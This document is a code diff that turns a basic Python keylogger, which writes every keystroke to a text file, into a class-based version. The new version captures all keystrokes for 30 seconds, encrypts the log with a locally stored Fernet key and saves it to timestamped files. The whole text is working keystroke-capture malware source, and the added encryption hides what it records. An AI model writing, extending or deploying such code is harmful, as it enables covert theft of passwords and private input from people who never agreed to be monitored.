@@ -1,20 +1,60 @@
-import pynput
-from pynput.keyboard import Key, Listener
+import os
 import time
+from datetime import datetime
+from pynput import keyboard
+from cryptography.fernet import Fernet
 
-log_file = "keylog.txt"
+class Keylogger:
+    def __init__(self):
+        self.log = ""
+        self.start_time = time.time()
+        self.duration = 30  # seconds
 
-def on_press(key):
-    with open(log_file, "a") as f:
+        key_path = "secret.key"
+        if not os.path.exists(key_path):
+            key = Fernet.generate_key()
+            with open(key_path, "wb") as f:
+                f.write(key)
+        else:
+            with open(key_path, "rb") as f:
+                key = f.read()
+        self.fernet = Fernet(key)
+
+        if not os.path.exists("logs"):
+            os.makedirs("logs")
+
+    def on_press(self, key):
         try:
-            f.write(f"{time.ctime()} - {key.char}\n")
+            self.log += key.char
         except AttributeError:
-            f.write(f"{time.ctime()} - {key}\n")
+            if key == keyboard.Key.space:
+                self.log += " "
+            elif key == keyboard.Key.enter:
+                self.log += "\n"
+            else:
+                self.log += f"[{key.name}]"
 
-def on_release(key):
-    if key == Key.esc:
-        # Stop listener on pressing ESC
-        return False
+    def start(self):
+        with keyboard.Listener(on_press=self.on_press) as listener:
+            print(f"[+] Keylogger started for {self.duration} seconds...")
+            while time.time() - self.start_time < self.duration:
+                time.sleep(0.1)
+            listener.stop()
+            print("[*] Keylogger stopped.")
 
-with Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
+        self.save_log()
+
+    def save_log(self):
+        now = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+        filename = f"logs/log_{now}.txt"
+        encrypted_data = self.fernet.encrypt(self.log.encode())
+        with open(filename, "wb") as f:
+            f.write(encrypted_data)
+        print(f"[+] Log saved to {filename}")
+
+def main():
+    logger = Keylogger()
+    logger.start()
+
+if __name__ == "__main__":
+    main()
